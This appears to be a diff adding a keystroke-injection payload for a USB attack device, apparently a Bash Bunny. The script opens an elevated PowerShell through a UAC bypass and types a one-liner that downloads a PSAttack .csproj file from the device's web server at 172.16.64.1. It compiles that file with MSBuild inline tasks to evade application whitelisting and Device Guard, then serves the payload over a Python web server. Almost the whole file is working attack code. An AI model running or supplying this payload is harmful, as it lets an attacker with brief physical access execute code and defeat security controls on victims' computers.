@@ -1,0 +1,55 @@
+#!/bin/bash
+#
+# Title:         PSAttack
+# Author:        illwill
+# Version:       0.1
+#
+# Opens powershell with UAC bypass, waits for webserver to start, determines if target is 32 or 64 bit, then downloads PSAttack .csproj file
+# onto the target and compiles it with MSBuild using 'Inline Tasks' to bypass Application Whitelisting and Device Guard
+# PSAttack from https://github.com/jaredhaight/psattack
+# MSBuild Inline Task bypass from @subtee http://subt0x10.blogspot.nl/2016/09/bypassing-application-whitelisting.html
+# PSA x32 & x64 .csproj files from Nicky Tyrer https://gist.github.com/NickTyrer/8389c3d5698511f5c81bc472ee49a11c
+#
+# Stage 1 (Yellow single blink)..............Running Powershell with UAC Bypass / Waiting for WebServer to start
+# BLUE (Blinking)............................Waiting for WebServer to start
+# Stage 2 (Yellow double blink)..............Webserver Started
+# Magenta(Blinking fast).....................Downloading PSAttack
+# Green(Blinking)............................PSAttack running
+
+
+LED B SLOW
+
+
+ATTACKMODE HID
+LED STAGE1
+
+# UAC Bypass
+Q GUI r
+Q DELAY 200
+Q STRING powershell -c "Start-Process powershell -verb runas"
+Q ENTER
+Q DELAY 2000
+Q LEFTARROW
+Q DELAY 250
+Q ENTER
+Q DELAY 1500
+
+LED B FAST
+# Powershell Payload: first wait for connection to  webserver, then pull PSAttack for 32 or 64 bit
+Q STRING "while (\$true) {If (Test-Connection 172.16.64.1 -count 1 -quiet) {if(!([System.IntPtr]::Size -ne 8)){\$a='64';\$b='64'}else{\$a='32';\$b=''}; (new-object System.Net.WebClient).DownloadFile(\"http://172.16.64.1/\$a\",'1.csproj');& C:\Windows\Microsoft.NET\Framework\$b\v4.0.30319\msbuild.exe 1.csproj;ri ./1.csproj}}"
+Q DELAY 300
+Q ENTER
+
+# Ethernet Attack Starts
+ATTACKMODE RNDIS_ETHERNET
+LED STAGE2
+#startup Python Webserver and block DNS 
+iptables -A OUTPUT -p udp --dport 53 -j DROP
+payload_dir=/root/udisk/payloads/$SWITCH_POSITION
+cd $payload_dir
+LED M FAST
+python -m SimpleHTTPServer 80 &
+while ! nc -z localhost 80; do sleep 0.2; done
+sleep 5
+kill -9 $pid
+LED FINISH
